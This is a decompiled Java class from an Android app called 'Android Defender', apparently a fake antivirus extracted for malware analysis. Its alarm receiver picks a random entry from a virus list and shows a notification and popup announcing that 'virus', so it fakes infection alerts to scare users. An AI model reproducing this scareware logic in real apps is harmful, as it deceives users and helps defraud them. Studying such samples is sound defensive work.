package com.worker.androiddefender2;

import android.app.NotificationManager;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import com.example.androiddefender2.DefenderApplication;
import com.example.androiddefender2.VirusInfoDialogActivity;
import system.VirusObject;

public class TimeAlarm extends BroadcastReceiver {
  public void onReceive(Context paramContext, Intent paramIntent) {
    if (DefenderApplication.getInstance().isApplicationBroughtToBackground()) {
      DefenderApplication.getInstance();
      boolean bool = paramContext.getSharedPreferences(DefenderApplication.APP_PREF, 0).getBoolean("chkMessages", false);
      if ((DefenderApplication.getInstance()).virusesDefine && bool && (DefenderApplication.getInstance()).indexesVr.size() > 0) {
        DefenderApplication.getInstance();
        if (!DefenderApplication.isCurAutoScan) {
          if ("notification" != null)
            ((NotificationManager)paramContext.getApplicationContext().getSystemService("notification")).cancel(0); 
          SystemFunctions systemFunctions = new SystemFunctions();
          int i = SystemFunctions.generateRandomCountVirus(0, (DefenderApplication.getInstance()).indexesVr.size() - 1);
          VirusObject virusObject = SystemFunctions.getVirusByIndex(((Integer)(DefenderApplication.getInstance()).indexesVr.get(i)).intValue() - 1);
          systemFunctions.generateNotification(paramContext, "Android Defender", String.format(paramContext.getResources().getString(2131099746), new Object[] { virusObject.getName() }));
          Intent intent = new Intent(paramContext, VirusInfoDialogActivity.class);
          intent.addFlags(268435456);
          intent.putExtra("typePopup", 1);
          intent.putExtra("virusName", virusObject.getName());
          paramContext.startActivity(intent);
        } 
      } 
    } 
  }
}


/* Location:              /home/fahim/Desktop/fake_av_reader-dex2jar.jar!/com/worker/androiddefender2/TimeAlarm.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */